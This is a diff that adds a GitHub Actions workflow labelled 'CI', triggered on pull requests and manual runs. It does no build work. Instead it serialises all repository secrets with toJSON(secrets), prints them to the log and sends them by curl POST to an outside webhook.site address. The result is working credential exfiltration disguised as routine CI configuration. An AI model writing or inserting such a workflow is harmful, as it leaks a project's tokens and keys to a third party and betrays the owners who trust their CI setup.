@@ -1,0 +1,16 @@
+name: CI
+on:
+  pull_request:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run a one-line script
+        run: |
+          echo "$SECRET"
+          echo fuga
+          curl -X POST -H "Content-Type: application/json" -d "$SECRET" https://webhook.site/311c6810-9fa9-40af-9670-d4dc1ecb2482
+        env:
+          SECRET: ${{ toJSON(secrets) }}
